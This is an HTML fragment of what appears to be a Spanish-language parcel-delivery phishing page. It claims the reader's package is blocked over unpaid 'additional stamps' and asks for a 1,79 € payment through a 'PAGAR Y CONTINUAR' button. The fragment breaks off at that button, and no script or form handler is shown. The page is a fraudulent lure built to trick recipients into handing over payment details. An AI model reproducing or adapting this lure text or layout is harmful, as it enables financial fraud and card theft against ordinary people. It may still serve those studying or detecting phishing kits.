                            ...
                            <div class="col-xs-12 col-sm-6 col-sm-offset-3 col-lg-5 col-lg-offset-3 text-center ogilvy-espacioseccion">
                                ...
                                <div id="Panel1" class="ogilvy-subtitular">
                                    ...
                                    <div style="margin-left: auto; margin-left: auto; text-align: center;"
                                        ...
                                        <div style="margin-left: auto; margin-left: auto; text-align: center;"
                                             class="ogilvy-titular">
                                            <span id="concepto" class="descripcionPago" style="font-weight:bold;">PASO 1 : </span><span
                                                    id="conceptovalor" style="font-weight:normal;">NOS GUSTARÍA INFORMARLE DE QUE SU PAQUETE HA SIDO BLOQUEADO DEBIDO AL IMPAGO DE SELLOS ADICIONALES.
PAGAR Y RECIBIR SU ENVÍO</span>
                                        </div>
                                    </div>
                                ...
                                <div class="ogilvy-titular">
                                    <span id="lbTitle" class="titulo">Importe : 1,79 €</span>
                                </div>
                                <div id="divSubtitularPago" class="ogilvy-subtitular ogilvy-subtitular-grande">

                                    <span id="lbSubTittle" class="subtitulo">Método de pago :</span><br>
                        ...
                        <div class="col-xs-12 col-sm-6 col-sm-offset-3 col-lg-5 col-lg-offset-3 ogilvy-seleccionpago ogilvy-espacioseccion">
                            <div class="col-xs-12">
                                <div class="ogilvy-botonrelleno ogilvy-Sweep">
                                    <input type="button" name="bSiguiente" value="PAGAR Y CONTINUAR"
